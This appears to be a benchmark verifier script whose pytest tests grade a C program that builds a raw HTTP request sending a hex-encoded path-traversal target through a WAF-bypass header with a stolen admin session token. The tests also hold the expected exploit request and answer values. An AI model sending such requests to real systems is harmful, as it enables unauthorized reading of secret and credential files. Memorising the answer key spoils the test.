#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import re
import stat
import uuid
import subprocess
import binascii

import pytest

SOURCE_PATH = "/home/user/payload_gen.c"
BINARY_PATH = "/home/user/payload_gen"
EXPLOIT_PATH = "/home/user/exploit.txt"
WAF_LOG_PATH = "/home/user/waf.log"
REBUILT_BINARY = "/tmp/payload_gen_rebuilt"
REQUIRED_TARGET = "../../../../home/user/secret.txt"


def derive_log_values():
    with open(WAF_LOG_PATH, "r", encoding="utf-8") as f:
        lines = f.readlines()

    candidates = []
    for line in lines:
        if 'USER="admin"' not in line or 'STATUS="200"' not in line or 'WAF="ALLOW"' not in line:
            continue

        header_match = re.search(r'HEADERS="([^:\"]+): ([0-9A-Fa-f]+)"', line)
        cookie_match = re.search(r'COOKIE="session_token=([^;\"]+);?', line)
        if not header_match or not cookie_match:
            continue

        encoded_value = header_match.group(2)
        try:
            decoded_value = bytes.fromhex(encoded_value).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            continue

        if decoded_value == "/etc/shadow":
            candidates.append((header_match.group(1), cookie_match.group(1)))

    assert len(candidates) == 1, "Could not uniquely identify the successful /etc/shadow bypass in waf.log"
    return candidates[0]


def expected_request(target_path):
    custom_header, session_token = derive_log_values()
    encoded_path = target_path.encode("utf-8").hex()
    lines = [
        "GET /download HTTP/1.1",
        "Host: localhost",
        f"Cookie: session_token={session_token}",
        f"{custom_header}: {encoded_path}",
        "",
    ]
    return "\r\n".join(lines).encode("utf-8") + b"\r\n"


def run_generator(binary, args, expect_success):
    result = subprocess.run(
        [binary, *args],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=5,
        check=False,
    )
    if expect_success:
        assert result.returncode == 0, (
            f"{binary} failed for one target argument with exit code {result.returncode}: "
            f"{result.stderr.decode(errors='replace')}"
        )
    else:
        assert result.returncode != 0, f"{binary} must reject invocations that do not have exactly one argument"


def assert_generates(binary, target_path):
    if os.path.lexists(EXPLOIT_PATH):
        os.unlink(EXPLOIT_PATH)
    run_generator(binary, [target_path], expect_success=True)
    assert os.path.isfile(EXPLOIT_PATH), f"{binary} did not create {EXPLOIT_PATH}"
    with open(EXPLOIT_PATH, "rb") as f:
        actual = f.read()
    assert actual == expected_request(target_path), (
        f"{binary} did not correctly encode and construct the request for target {target_path!r}"
    )


def test_00_program_artifacts_and_behavior():
    assert os.path.exists(SOURCE_PATH), f"Missing required C source: {SOURCE_PATH}"
    assert stat.S_ISREG(os.stat(SOURCE_PATH, follow_symlinks=False).st_mode), f"{SOURCE_PATH} must be a regular file"

    assert os.path.exists(BINARY_PATH), f"Missing required compiled binary: {BINARY_PATH}"
    binary_stat = os.stat(BINARY_PATH, follow_symlinks=False)
    assert stat.S_ISREG(binary_stat.st_mode), f"{BINARY_PATH} must be a regular file"
    assert os.access(BINARY_PATH, os.X_OK), f"{BINARY_PATH} is not executable"
    with open(BINARY_PATH, "rb") as f:
        assert f.read(4) == b"\x7fELF", f"{BINARY_PATH} is not a compiled ELF binary"

    compile_result = subprocess.run(
        ["gcc", "-o", REBUILT_BINARY, SOURCE_PATH],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=10,
        check=False,
    )
    assert compile_result.returncode == 0, (
        "payload_gen.c does not compile successfully:\n"
        + compile_result.stderr.decode(errors="replace")
    )

    for binary in (BINARY_PATH, REBUILT_BINARY):
        run_generator(binary, [], expect_success=False)
        run_generator(binary, ["one", "two"], expect_success=False)

        targets = [
            "../../tmp/" + uuid.uuid4().hex + "/alpha.txt",
            "/var/tmp/file-" + uuid.uuid4().hex + ".dat",
        ]
        for target in targets:
            assert_generates(binary, target)

    # Leave the required final artifact generated by the submitted binary.
    assert_generates(BINARY_PATH, REQUIRED_TARGET)


def test_exploit_file_exists():
    """Test that the exploit.txt file was generated."""
    exploit_path = "/home/user/exploit.txt"
    assert os.path.isfile(exploit_path), f"File not found: {exploit_path}. The C program must write the output to this file."


def test_exploit_file_content():
    """Test that the exploit.txt file contains the correctly constructed HTTP request."""
    exploit_path = "/home/user/exploit.txt"
    assert os.path.isfile(exploit_path), f"File not found: {exploit_path}."

    with open(exploit_path, "rb") as f:
        actual_content = f.read()

    # Derive the expected payload
    target_path = "../../../../home/user/secret.txt"
    hex_encoded_path = binascii.hexlify(target_path.encode('utf-8')).decode('utf-8')
    session_token = "adm_8f7e6d5c4b"
    custom_header = "X-Bypass-Target"

    expected_lines = [
        "GET /download HTTP/1.1",
        "Host: localhost",
        f"Cookie: session_token={session_token}",
        f"{custom_header}: {hex_encoded_path}",
        ""
    ]

    expected_content = "\r\n".join(expected_lines).encode('utf-8') + b"\r\n"

    assert actual_content == expected_content, (
        "The content of exploit.txt does not match the expected raw HTTP request.\n"
        "Ensure you are using CRLF (\\r\\n) for line endings, the correct encoded path, "
        "the correct custom header, and the admin session token."
    )
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
